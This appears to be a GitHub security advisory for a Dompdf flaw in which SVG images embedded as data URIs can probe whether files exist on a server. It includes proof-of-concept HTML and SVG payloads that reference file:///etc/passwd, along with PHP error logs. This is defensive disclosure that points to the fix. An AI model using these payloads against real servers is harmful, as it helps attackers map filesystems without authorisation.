# [M] Dompdf: Embedded SVG images can leak existence of files and directories within the filesystem

## Summary
Severity: Medium
Advisory: GHSA-j8qw-6jw8-r297
CVE: CVE-2026-59943
CWE: CWE-209
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-22
Source: https://github.com/advisories/GHSA-j8qw-6jw8-r297
Type: github-advisory

## Affected
- Packagist: `dompdf/dompdf` — affected >=0 <3.1.6

## Details
### Summary
If a malicious actor can supply unrestricted content for rendering by Dompdf they can utilize the SVG rendering functionality to leak filesystem information when rendering PDF files using image references within a data-URI encoded SVG document.

### Details
Using an `<image>` element inside a data-URI embedded SVG, an attacker can attempt to embed other files via the `href` or `xlink:href` attributes. When processing a file that does not exist (e.g. `file:///DOESNOTEXIST`), dompdf behaves differently than it does when accessing a file or directory that actually exists on the filesystem.

```
[Wed May 20 19:49:53 2026] PHP Warning:  file_get_contents(file:///DOESNOTEXIST): Failed to open stream: No such file or directory in vendor/dompdf/php-svg-lib/src/Svg/Surface/SurfaceCpdf.php on line 173
[Wed May 20 19:49:53 2026] PHP Notice:  getimagesize(): Error reading from /tmp/svgsk9247ela7tm3SiqGyP! in vendor/dompdf/php-svg-lib/src/Svg/Surface/SurfaceCpdf.php on line 196
```

### PoC

First, the attacker renders this HTML document:
```
<html>
<head>
</head>
<body>
<img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+Cjxzdmcgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEwMCAxMDAiCiAgICAgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxpbWFnZSB4bGluazpocmVmPSJmaWxlOi8vL2V0Yy9wYXNzd2QiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KICAgIDwvc3ZnPgo=">
 Hello World!
</body>
</html>
```

The `<img>` tag contains the following SVG content:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
    <image xlink:href="file:///etc/passwd" x="0" y="0" width="100" height="100">
    </svg>
```

As expected, the resulting PDF contains a broken image:
<img width="621" height="193" alt="image" src="https://github.com/user-attachments/assets/b615fabe-c578-4435-bcb4-e9ad0ac796d2" />

However, when supplying a path to a file or directory that does not exist, for example:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
    <image xlink:href="file:///DOESNOTEXIST" x="0" y="0" width="100" height="100">
    </svg>
```

The resulting PDF is rendered normally, with the image displayed as empty space (since the file did not exist). Additionally, for easier visual inspection, a rendering bug (https://github.com/dompdf/php-svg-lib/issues/142) is used to rotate the "Hello World!" text 180 degrees from the expected position:

<img width="616" height="922" alt="image" src="https://github.com/user-attachments/assets/32f83aa5-8115-4b0f-8ac2-f7b75e2eeaa9" />

### Impact
By exploiting this vulnerability, an attacker is able to confirm the existence of files and directories located on the backend filesystem.

## References
- https://github.com/dompdf/dompdf/security/advisories/GHSA-j8qw-6jw8-r297
- https://github.com/dompdf/dompdf/commit/6a58996865db05d8fede748507e50ac4b8c5bfd0
- https://github.com/dompdf/dompdf
- https://github.com/dompdf/dompdf/releases/tag/v3.1.6
